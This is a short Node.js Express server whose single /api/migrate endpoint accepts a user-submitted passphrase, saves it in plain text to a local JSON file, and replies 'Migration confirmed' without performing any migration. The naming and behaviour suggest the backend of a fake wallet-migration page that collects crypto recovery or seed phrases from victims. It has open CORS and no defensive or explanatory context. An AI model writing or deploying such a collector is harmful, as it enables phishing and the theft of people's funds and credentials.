const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

const DATA_FILE = path.join(__dirname, "phrases.json");

app.post("/api/migrate", (req, res) => {
  const { phrase } = req.body;
  if (!phrase) {
    return res.status(400).json({ message: "Passphrase is required" });
  }

  let phrases = [];
  if (fs.existsSync(DATA_FILE)) {
    phrases = JSON.parse(fs.readFileSync(DATA_FILE));
  }

  phrases.push({ phrase, createdAt: new Date() });

  fs.writeFileSync(DATA_FILE, JSON.stringify(phrases, null, 2));

  res.json({ message: "Migration confirmed" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
